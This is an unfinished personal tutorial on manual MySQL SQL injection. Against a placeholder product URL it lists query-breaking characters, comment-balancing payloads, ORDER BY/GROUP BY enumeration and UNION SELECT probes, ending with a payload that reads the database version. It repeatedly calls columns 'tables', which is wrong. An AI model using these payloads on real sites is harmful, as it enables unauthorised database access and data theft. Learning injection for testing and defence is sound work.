# MySQL SQL Injection

#### My steps to perform SQL Injection.
1. Break the Query.
2. Fix the Query.
3. Get the total number of tables.
4. Get the vulnarable table(s).
5. Exploit. (get the data from database)


### 1) Break the Query.
- let's say we have target https://website.com/product/id?=23 now, we want to test this URL for SQL Injection. So, as described in steps above, the very first thing we've to do is **Break the Query**.
- So, for breaking the query, we can use ``` ', ", `, . ```
 - example,
   - https://website.com/product/id?=23'
   - https://website.com/product/id?=23"
- after adding the ``` ', ", `, .```, you'll see error messages like, `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1` or maybe unusual behaviour in target website.

### 2) Fix the Query.
- after breaking the query, we've to fix the query. So, we can **balance** the **SQL QUERY**.
- So, for that we can use ``` --, --+, -- -, #, --#, ., -, /*, '), "), `), ')), ")),`)), ') -- ```
- example,
   - https://website.com/product/id?=23' --
   - https://website.com/product/id?=23' --+
   - https://website.com/product/id?=23' -- -
   - https://website.com/product/id?=23' #
   - https://website.com/product/id?=23' --#
   - https://website.com/product/id?=23' /*
   - https://website.com/product/id?=.23' --+ (see the `.`)
   - https://website.com/product/id?=-23' --+ (see the `-`)
   - https://website.com/product/id?=-23') --+ (see the `-`)
   - etc. (*there are many ways to fix the query. at the time of wrting this, I forgot some of them. I'll add them If I came to know about it. till then, add your own variations to it.*)
 
### 3) Get the total number of tables.
- after balancing/fixing the query, we need to solve this question. **how many tables are there in the database?**
- So, to check the tables we can use ``` ORDER BY, GROUP BY, PROCEDURE ANALYSE() ```
- example,
   - https://website.com/product/id?=23' ORDER BY 5-- ERROR.
   - https://website.com/product/id?=23' ORDER BY 4-- ERROR.
   - https://website.com/product/id?=23' ORDER BY 3-- NO ERROR.
     - So, website has 3 tables.
   - https://website.com/product/id?=23' GROUP BY 1,2,3,4,5-- ERROR.
   - https://website.com/product/id?=23' GROUP BY 1,2,3,4-- ERROR.
   - https://website.com/product/id?=23' GROUP BY 1,2,3-- NO ERROR.
     - So, website has 3 tables.
   - https://website.com/product/id?=23' PROCEDURE ANALYSE()-- ERROR. (In this method, the website will act wiredly. So, keep closer look on website. ex. list random lists, paragraphs, errors, or something else, etc.)
     - Look at the website, if website lists random things let's say some 3 dots or whatever. then, confirm that, website has 3 tables.

### 4) Get the vulnarable table(s).
- after getting the total number of table, now it's time to find vulnerable table, where we can try to place our pyloads strings to get the data from the database.
- So, to get the vulnerable table, we can use ```UNION SELECT NULL or INT ```.
- add the NULL or INT value, total number of tables we get.
- example,
   - https://website.com/product/id?=23' UNION SELECT 1,2,3-- Because, we got the total 3 tables.
   - https://website.com/product/id?=23' UNION SELECT NULL,NULL,NULL--
- now, in the case of `https://website.com/product/id?=23' UNION SELECT 1,2,3--`, you'll see a numbers been reflacted on the website. ex. 2,3. So, table 2 & 3 is vulnerable.
- in case of NULL, we've to replace NULL by adding strings in each NULL value to get the vulnerable table.
- example.
  - https://website.com/product/id?=23' UNION SELECT 'findVulTbl',NULL,NULL-- See, if `findVulTbl` been reflacted on website or not. if yes, then, congratulations, we've found vulnerable table.
  - if not, go ahead and try, https://website.com/product/id?=23' UNION SELECT NULL, 'findVulTbl',NULL--.
  - try until you find some string being reflacted on website.

5. Exploit. (get the data from database).
- So, after getting vulnerable table(s), we can get the data from database by using various payloads.
- example : https://website.com/product/id?=23' UNION SELECT NULL,@@version,NULL-- to get the database version.


**Note:** not completed. to be continued...
